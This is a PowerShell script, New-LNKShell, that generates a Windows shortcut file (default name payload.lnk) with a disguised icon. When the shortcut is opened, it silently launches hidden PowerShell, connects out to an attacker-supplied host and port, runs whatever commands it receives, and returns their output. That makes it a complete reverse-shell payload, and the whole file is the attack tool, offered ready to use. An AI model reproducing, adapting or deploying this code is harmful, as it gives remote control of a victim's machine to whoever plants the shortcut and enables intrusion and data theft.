<#
.SYNOPSIS
Creates an LNK file with an embedded reverse tcp shell. Original code from
http://onready.me/old_horse_attacks.html.

.PARAMETER LHOST
Target for the reverse shell.

.PARAMETER LPORT
Target port on LHOST. Defaults to 4444.

.PARAMETER OutPath
Target for created shortcut. Defaults to current directory.

.PARAMETER Filename
Target filename. Defaults to 'payload.lnk'.

.EXAMPLE
PS> New-LNKShell -LHOST 192.168.1.1 -LPORT 4444
#>

[CmdletBinding()]

Param (
    [ValidateRange(1,65535)]
    [int]
    $LPORT = 4444,
    [Parameter(Mandatory = $True)]
    [string]
    $LHOST,
    [string]
    $Filename = 'payload.lnk',
    [ValidateScript({Test-Path -Path $_})]
    [string]
    $OutPath = (Join-Path -Path (Split-Path -Parent -Path $MyInvocation.MyCommand.Definition) -ChildPath $Filename)
)

$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($OutPath)
$Shortcut.TargetPath = '%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe'
$Shortcut.IconLocation = '%SystemRoot%\System32\Shell32.dll,21'
$Shortcut.Arguments = '-WindowStyle Hidden /c $Client = New-Object System.Net.Sockets.TCPClient(' +
                       $('"""' + $LHOST + '"""') + ',' + $LPORT + ');
                       $Stream = $Client.GetStream();
                       [byte[]]$Bytes = 0..255|%{0};
                       while(($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0){;
                       $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($Bytes,0, $i);
                       $SendBack = (iex $data 2>&1 | Out-String );
                       $SendBack2  = $SendBack + """PS """ + (pwd).Path + """> """;
                       $SendByte = ([text.encoding]::ASCII).GetBytes($SendBack2);
                       $Stream.Write($SendByte,0,$SendByte.Length);
                       $Stream.Flush()};
                       $Client.Close()'
$Shortcut.Save()